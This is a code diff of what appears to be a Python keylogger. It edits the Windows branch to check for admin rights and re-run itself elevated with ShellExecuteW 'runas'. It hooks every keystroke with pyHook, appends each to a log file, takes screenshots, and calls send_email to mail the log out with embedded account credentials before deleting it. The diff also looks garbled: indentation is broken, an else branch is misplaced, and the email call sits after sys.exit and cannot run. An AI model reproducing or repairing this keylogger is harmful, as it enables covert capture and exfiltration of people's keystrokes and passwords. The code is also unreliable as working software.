@@ -171,50 +171,25 @@ try:
     screenshot()
 
   elif system == "Windows":
-    import sys
-    import ctypes
+    import ctypes, sys
 
-    def run_as_admin(argv=None, debug=False):
-      shell32 = ctypes.windll.shell32
-      if argv is None and shell32.IsUserAnAdmin():
-        return True
+    def is_admin():
+      try:
+          return ctypes.windll.shell32.IsUserAnAdmin()
+      except:
+          return False
 
-      if argv is None:
-        argv = sys.argv
-      if hasattr(sys, '_MEIPASS'):
-        # Support pyinstaller wrapped program.
-        arguments = map(unicode, argv[1:])
-      else:
-        arguments = map(unicode, argv)
-      argument_line = u' '.join(arguments)
-      executable = unicode(sys.executable)
-      if debug:
-        print 'Command line: ', executable, argument_line
-      ret = shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
-      if int(ret) <= 32:
-        return False
-      return None
+    if is_admin():
+      def OnKeyboardEvent(event):
+        fob=open(log_file,"a")
+        fob.write(event.Key)
+        fob.write("\n")
 
-    ret = run_as_admin()
-    if ret is True:
-        print 'I have admin privilege.'
-        raw_input('Press ENTER to exit.')
-    elif ret is None:
-        print 'I am elevating to admin privilege.'
-        raw_input('Press ENTER to exit.')
-    else:
-        print 'Error(ret=%d): cannot elevate privilege.' % (ret, )
-        
-    def OnKeyboardEvent(event):
-      fob=open(log_file,"a")
-      fob.write(event.Key)
-      fob.write("\n")
-
-      if event.Ascii==59:
-        fob.close
-        sys.exit(0)
-        send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
-        os.remove(log_file)        
+        if event.Ascii==59:
+          fob.close
+          sys.exit(0)
+          send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
+          os.remove(log_file)        
 
     hooks_manager = pyHook.HookManager()
     hooks_manager.KeyDown = OnKeyboardEvent
@@ -222,5 +197,26 @@ try:
     pythoncom.PumpMessages()  
     screenshot()
 
+      # Code of your program here
+    else:
+      def OnKeyboardEvent(event):
+        fob=open(log_file,"a")
+        fob.write(event.Key)
+        fob.write("\n")
+
+        if event.Ascii==59:
+          fob.close
+          sys.exit(0)
+          send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
+          os.remove(log_file)        
+
+    hooks_manager = pyHook.HookManager()
+    hooks_manager.KeyDown = OnKeyboardEvent
+    hooks_manager.HookKeyboard()
+    pythoncom.PumpMessages()  
+    screenshot()
+      # Re-run the program with admin rights
+      ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None,1)
+    
 except(KeyboardInterrupt):
   print("Sorry Not Day")
